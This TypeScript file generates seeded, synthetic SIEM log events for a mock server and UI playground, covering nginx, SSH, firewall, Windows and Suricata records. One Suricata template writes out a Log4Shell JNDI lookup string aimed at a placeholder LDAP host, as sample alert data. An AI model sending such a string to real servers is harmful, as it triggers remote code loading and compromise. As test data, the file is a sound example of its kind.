/**
 * SIEM 스타일 가짜 로그 이벤트 생성기 (시드 고정 → 매번 같은 데이터).
 * mock-server(Node type stripping) 와 playground(Vite) 양쪽에서 사용한다.
 */

export interface MockEvent {
  _time: string
  event_id: string
  host: string
  source: string
  sourcetype: string
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
  action: string
  user: string
  src_ip: string
  dest_ip: string
  dest_port: number
  bytes: number
  message: string
  geo: { country: string; city: string }
  /** 원본 payload (HTTP 요청, Windows XML, base64 패킷 등) */
  payload?: string
  /** payload 인코딩 (base64 등) */
  payload_encoding?: string
  [key: string]: unknown
}

function mulberry32(seed: number): () => number {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}

const HOSTS = ['web-01', 'web-02', 'web-03', 'api-01', 'api-02', 'db-01', 'fw-edge-01', 'dc-01', 'vpn-gw-01', 'mail-01']
const USERS = ['admin', 'root', 'alice', 'bob', 'charlie', 'svc_backup', 'svc_deploy', 'kim.minsu', 'lee.jiwon', 'park.hyun', '-']
const GEO = [
  { country: 'KR', city: 'Seoul' },
  { country: 'KR', city: 'Busan' },
  { country: 'US', city: 'Ashburn' },
  { country: 'CN', city: 'Beijing' },
  { country: 'RU', city: 'Moscow' },
  { country: 'DE', city: 'Frankfurt' },
  { country: 'JP', city: 'Tokyo' },
  { country: 'NL', city: 'Amsterdam' },
]

type Template = {
  weight: number
  source: string
  sourcetype: string
  hosts: string[]
  build: (r: () => number, ctx: { user: string; src: string; dst: string; port: number }) => {
    severity: MockEvent['severity']
    action: string
    message: string
    port?: number
    payload?: string
    payload_encoding?: string
  }
}

const UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/141.0 Safari/537.36',
  'curl/8.9.1',
  'python-requests/2.32.3',
  'Nmap Scripting Engine',
  'sqlmap/1.8.5#stable',
]

/** 가짜 IPv4+TCP 헤더 + 애플리케이션 데이터를 base64 로 */
function fakePacket(r: () => number, data: string): string {
  let bin = ''
  bin += String.fromCharCode(0x45, 0x00, (40 + data.length) >> 8, (40 + data.length) & 0xff,Math.floor(r() * 256), Math.floor(r() * 256), 0x40, 0x00, 0x40, 0x06)
  for (let i = 0; i < 30; i++) bin += String.fromCharCode(Math.floor(r() * 256))
  bin += data
  return btoa(bin)
}

const pick = <T>(r: () => number, arr: readonly T[]): T => arr[Math.floor(r() * arr.length)]

const TEMPLATES: Template[] = [
  {
    weight: 30,
    source: '/var/log/nginx/access.log',
    sourcetype: 'nginx:access',
    hosts: ['web-01', 'web-02', 'web-03'],
    build: (r, c) => {
      const status = pick(r, [200, 200, 200, 200, 301, 304, 403, 404, 404, 500, 502])
      const path = pick(r, ['/', '/login', '/api/v1/users', '/api/v1/orders', '/admin', '/wp-login.php', '/.env', '/static/app.js'])
      const method = pick(r, ['GET', 'GET', 'GET', 'POST', 'PUT', 'DELETE'])
      const ua = pick(r, UAS)
      const bytes = Math.floor(r() * 50000)
      const payload =
        method === 'GET' || method === 'DELETE'
          ? `${method} ${path} HTTP/1.1\r\nHost: shop.example.com\r\nUser-Agent: ${ua}\r\nAccept: */*\r\nX-Forwarded-For: ${c.src}\r\n\r\n`
          : JSON.stringify({
              request: {
                method,
                path,
                headers: { host: 'shop.example.com', 'user-agent': ua, 'content-type': 'application/json' },
                body: path === '/login' ? { username: c.user, password: '********' } : { id: Math.floor(r() * 10000), qty: 1 + Math.floor(r() * 5) },
              },
              response: { status, bytes },
            })
      return {
        severity: status >= 500 ? 'high' : status >= 400 ? 'low' : 'info',
        action: status < 400 ? 'allowed' : 'error',
        message: `${c.src} - ${c.user} "${method} ${path} HTTP/1.1" ${status} ${bytes}`,
        port: 443,
        payload,
      }
    },
  },
  {
    weight: 20,
    source: '/var/log/secure',
    sourcetype: 'linux_secure',
    hosts: ['web-01', 'api-01', 'api-02', 'db-01'],
    build: (r, c) => {
      const ok = r() > 0.35
      return {
        severity: ok ? 'info' : r() > 0.7 ? 'high' : 'medium',
        action: ok ? 'success' : 'failure',
        message: ok
          ? `sshd[${1000 + Math.floor(r() * 9000)}]: Accepted publickey for ${c.user} from ${c.src} port ${c.port} ssh2`
          : `sshd[${1000 + Math.floor(r() * 9000)}]: Failed password for invalid user ${c.user} from ${c.src} port ${c.port} ssh2`,
        port: 22,
      }
    },
  },
  {
    weight: 25,
    source: 'firewall',
    sourcetype: 'pan:traffic',
    hosts: ['fw-edge-01'],
    build: (r, c) => {
      const blocked = r() > 0.6
      const app = pick(r, ['ssl', 'web-browsing', 'dns', 'ssh', 'rdp', 'smb', 'unknown-tcp'])
      return {
        severity: blocked ? pick(r, ['medium', 'high', 'low'] as const) : 'info',
        action: blocked ? 'blocked' : 'allowed',
        message: `TRAFFIC ${blocked ? 'deny' : 'allow'} app=${app} ${c.src} -> ${c.dst}:${c.port} rule=${blocked ? 'deny-inbound' : 'allow-outbound'}`,
      }
    },
  },
  {
    weight: 15,
    source: 'WinEventLog:Security',
    sourcetype: 'wineventlog',
    hosts: ['dc-01'],
    build: (r, c) => {
      const code = pick(r, [4624, 4624, 4625, 4625, 4672, 4720, 4740, 1102])
      const map: Record<number, [MockEvent['severity'], string, string]> = {
        4624: ['info', 'success', 'An account was successfully logged on'],
        4625: ['medium', 'failure', 'An account failed to log on'],
        4672: ['low', 'success', 'Special privileges assigned to new logon'],
        4720: ['high', 'success', 'A user account was created'],
        4740: ['high', 'locked', 'A user account was locked out'],
        1102: ['critical', 'cleared', 'The audit log was cleared'],
      }
      const [severity, action, text] = map[code]
      const payload = [
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">',
        '  <System>',
        '    <Provider Name="Microsoft-Windows-Security-Auditing" />',
        `    <EventID>${code}</EventID>`,
        '    <Channel>Security</Channel>',
        '    <Computer>dc-01.corp.local</Computer>',
        '  </System>',
        '  <EventData>',
        `    <Data Name="TargetUserName">${c.user}</Data>`,
        '    <Data Name="TargetDomainName">CORP</Data>',
        `    <Data Name="LogonType">${pick(r, [2, 3, 10])}</Data>`,
        `    <Data Name="IpAddress">${c.src}</Data>`,
        '  </EventData>',
        '</Event>',
      ].join('\n')
      return {
        severity,
        action,
        message: `EventCode=${code} ${text}. Account Name: ${c.user} Source Network Address: ${c.src}`,
        port: 445,
        payload,
      }
    },
  },
  {
    weight: 10,
    source: 'ids',
    sourcetype: 'suricata:alert',
    hosts: ['fw-edge-01', 'vpn-gw-01'],
    build: (r, c) => {
      const sig = pick(r, [
        ['critical', 'ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228)'],
        ['high', 'ET SCAN Nmap Scripting Engine User-Agent Detected'],
        ['high', 'ET MALWARE Possible Cobalt Strike Beacon'],
        ['medium', 'ET POLICY SSH session in progress on Unusual Port'],
        ['critical', 'ET TROJAN Known Ransomware C2 Domain Lookup'],
        ['low', 'ET INFO Observed DNS Query to .xyz TLD'],
      ] as const)
      const data = sig[1].includes('Log4j')
        ? 'GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: ${jndi:ldap://203.0.113.7:1389/a}\r\n\r\n'
        : sig[1].includes('Nmap')
          ? 'GET /nmaplowercheck HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)\r\n\r\n'
          : `\x17\x03\x03${String.fromCharCode(...Array.from({ length: 48 }, () => Math.floor(r() * 256)))}`
      return {
        severity: sig[0],
        action: r() > 0.5 ? 'blocked' : 'alerted',
        message: `[1:${2000000 + Math.floor(r() * 99999)}:1] ${sig[1]} {TCP} ${c.src} -> ${c.dst}:${c.port}`,
        payload: fakePacket(r, data),
        payload_encoding: 'base64',
      }
    },
  },
]

const totalWeight = TEMPLATES.reduce((a, t) => a + t.weight, 0)

function ip(r: () => number, internal: boolean): string {
  if (internal) return `10.${Math.floor(r() * 4)}.${Math.floor(r() * 255)}.${1 + Math.floor(r() * 254)}`
  return `${1 + Math.floor(r() * 223)}.${Math.floor(r() * 255)}.${Math.floor(r() * 255)}.${1 + Math.floor(r() * 254)}`
}

/**
 * @param count 이벤트 수
 * @param endTime 가장 최근 이벤트 시각 (ms)
 * @param spanMs 전체 시간 범위 (기본 24h)
 */
export function generateEvents(count: number, endTime = Date.now(), spanMs = 24 * 3600 * 1000, seed = 42): MockEvent[] {
  const r = mulberry32(seed)
  const step = spanMs / Math.max(1, count)
  const out: MockEvent[] = new Array(count)
  for (let i = 0; i < count; i++) {
    let w = r() * totalWeight
    let tpl = TEMPLATES[0]
    for (const t of TEMPLATES) {
      if ((w -= t.weight) < 0) {
        tpl = t
        break
      }
    }
    const inbound = r() > 0.5
    const ctx = {
      user: pick(r, USERS),
      src: ip(r, !inbound),
      dst: ip(r, inbound),
      port: pick(r, [22, 53, 80, 443, 445, 3389, 8080, 8443, 1024 + Math.floor(r() * 60000)]),
    }
    const built = tpl.build(r, ctx)
    const time = endTime - i * step - Math.floor(r() * step)
    out[i] = {
      _time: new Date(time).toISOString(),
      event_id: `evt-${(count - i).toString().padStart(7, '0')}`,
      host: pick(r, tpl.hosts.length ? tpl.hosts : HOSTS),
      source: tpl.source,
      sourcetype: tpl.sourcetype,
      severity: built.severity,
      action: built.action,
      user: ctx.user,
      src_ip: ctx.src,
      dest_ip: ctx.dst,
      dest_port: built.port ?? ctx.port,
      bytes: Math.floor(r() * 200000),
      message: built.message,
      geo: pick(r, GEO),
    }
    if (built.payload) out[i].payload = built.payload
    if (built.payload_encoding) out[i].payload_encoding = built.payload_encoding
  }
  return out
}
